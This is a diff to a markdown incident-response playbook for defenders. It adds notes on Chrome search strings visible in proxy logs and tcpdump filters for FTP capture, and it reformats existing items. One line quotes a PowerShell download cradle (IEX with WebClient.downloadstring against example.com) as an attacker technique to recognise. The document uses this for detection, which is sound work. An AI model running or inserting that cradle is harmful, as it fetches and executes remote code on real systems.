@@ -56,6 +56,11 @@ Every thing will also be kept on a single page so you'll be able to CTRL+f.
   - [Magic bytes for common files](#magic-bytes-common-files)
   - [Service start type](#service-start-types)
   - [Interesting domain information](#interesting-domain-info)
+  - [Browser behaviour](#browser-behaviour)
+- [Live capturing tools)(#live-cap-tools)
+  - [tcpdump](#live-tcpdump)
+- [Analysis tips & tools](#analysis-tools)
+  - [Mounting shared folders in Linux](#mount-share-folders-linux)
 
 <a name="things-to-do"></a>
 ## Things to do
@@ -65,7 +70,7 @@ This is probably never ending but here is a list of things I want to add. Reach 
 * Event ID table, build more on what's currently there.
 * Include SEC504 and FOR500 into the playbook.
 * Google analytic cookies, UTM.
-* Hubspot targeting cookies, __hstc.
+* Hubspot targeting cookies, ```__hstc```.
 * DNS record types (572-b2p55) grab from my index. 
 * acronym list
 *	tshark into tools with basic switches.
@@ -93,19 +98,19 @@ IOC = indicator of compromsie
 
 A quick win for analysts is to identify processes found in the process list that try to appear legitimate but are misnamed.
 
-For example, SVCHOST renamed to SCVHOST. It also useful to look at the parent process and ensure that it is what it should be. A common process table can be found [here](https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf).
+For example, `SVCHOST` renamed to `SCVHOST`. It also useful to look at the parent process and ensure that it is what it should be. A common process table can be found [here](https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf).
 
 <a name="remote-processes-in-memory"></a>
 ### Remote processes in memory
 
-If you happen to find the process WMIPrvSE in a memory image this can indicate a remote connection to the machine. If this is uncommon for the network that you are looking at then this could indicate suspicious/malicious activity. 
+If you happen to find the process `WMIPrvSE` in a memory image this can indicate a remote connection to the machine. If this is uncommon for the network that you are looking at then this could indicate suspicious/malicious activity. 
 
 <a name="ps-download-cradle"></a>
 ### PowerShell download cradle 
 
 Many attackers will use the following command to reach out and download other files, commonly seen in webshells.
 
-IEX(New-Object System.Net.WebClient).downloadstring(‘http://example.com/foo.exe’)
+```IEX(New-Object System.Net.WebClient).downloadstring(‘http://example.com/foo.exe’)```
 
 <a name="dc-ntdsutil"></a>
 ### Domain controller ntdsutil
@@ -123,7 +128,7 @@ Google will record its search history almost like a key logger in proxy logs. Do
 
 #### Mail
 
-You may also be able to grep out 'example-mail.com' and then look for 'sentconfirm', 'SHOW_CONFIRMPAGE', or logon/logout sessions.
+You may also be able to grep out 'example-mail.com' and then look for `sentconfirm`, `SHOW_CONFIRMPAGE`, or logon/logout sessions.
 
 #### Data dumping
 
@@ -289,11 +294,54 @@ While these are the common magic bytes that you’ll come across a comprehensive
 
 It is possible to query the following registry key on the domain controller,
 
-*SOFTWARE\Microsoft\Windows NT\CurrentVersion\Profile List*
+```SOFTWARE\Microsoft\Windows NT\CurrentVersion\Profile List```
 
 This can be used to compare an SID and get the username of the domain user.
 
+<a name="browser-behaviour"></a>
+### Browser behaviour
+[*back to table of contents*](#b2t)
 
+#### Google Chrome
+
+**Search strings**
+
+These can be found in proxy logs or even in memory. Below is an example of how we can see what the logged on user was searching for. It’s almost like Chrome is a keylogger. 
+When the user is typing into the browser address bar we will see request strings like (the user would not see these strings):
+
+```/s?hl=en&sugexp=tsh&gs_nf=l&gs_mss=online%20drop%20si&cp=16&gs_id=lv&xhr=t&q=online%20drop%20site&pf=p&output=search&sclient=psyab&oq=&aq=&aqi=&aql=&gs_l=&pbx=l&bav=on.2, or.r_gc.r_pw.r_qf.,cf.osb&fp=68c4c5cdla158f5c&biw=1128&bih=580&tch=l&ech=16&psi=3EjZT8mwL8Pt6gGnr728Aw.1339640029993.1```
+
+When the user types into the search box on google.com then the request strings look like,
+```/complete/search?sugexp=chrome,mod=9&client=chrome&hl=enUS&q=deaddrop.com```
+
+When the user hits ENTER after entering the search in the address bar or the search box the following HTTP request would display in the user’s address bar,
+`/search?sugexp=chrome,mod=9&sourceid=chrome&ie=UTF-8&q=dead+drop+for+data`
+
+<a name="live-cap-tools"></a>
+## Live capturing tools
+
+<a name="live-tcpdump"></a>
+### tcpdump
+[*back to table of contents*](#b2t)
+
+#### Capturing FTP
+
+To capture active-mode FTP traffic use the following, 
+
+```sudo tcpdump -i ens33 -w ftp_active_full.pcap '(tcp and (port 21 or port 20))’```
+
+To capture active and passive FTP traffic use, 
+
+```sudo tcpdump - i ens33 -w ftp_full.pcap '(tcp and (port 21 or ((src portrange 1024-65535 or src port 20) and (dst portrange 1024- 65535 or dst port 20)))'```
+
+<a name="analysis-tools"></a>
+## Analysis tips & tools
+
+<a name="mount-share-folders-linux"></a>
+### Mounting shared folders in Linux
+[*back to table of contents*](#b2t)
+
+![sharedfolder image](https://c-o-d-e-b-e-a-r.github.io/IAT/images/sharedfolder.png)
 
 
 
